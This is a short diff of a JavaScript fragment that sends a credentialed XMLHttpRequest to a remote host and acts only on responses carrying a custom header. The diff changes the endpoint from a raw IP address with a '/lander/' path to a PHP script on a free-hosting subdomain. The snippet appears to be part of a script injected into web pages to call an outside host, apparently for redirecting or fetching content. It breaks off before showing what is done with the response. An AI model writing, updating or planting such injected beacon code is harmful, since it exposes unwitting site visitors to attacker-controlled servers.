@@ -2,8 +2,7 @@
 if (window.location.href.search("[?&]_novisit=on") != -1) return;
 var xhr = new XMLHttpRequest();
 xhr.withCredentials = true;
-xhr.open("GET", "http://185.179.189.37/lander/xhr-json/test.json", true);
-xhr.setRequestHeader('Accept', '*/*');
+xhr.open("GET", "http://sh1083300.a.had.su/test.php", true);
 xhr.onload = function() {
     if (xhr.status !== 200) return;
     if (xhr.getResponseHeader("Struct-Response") !== "true") {
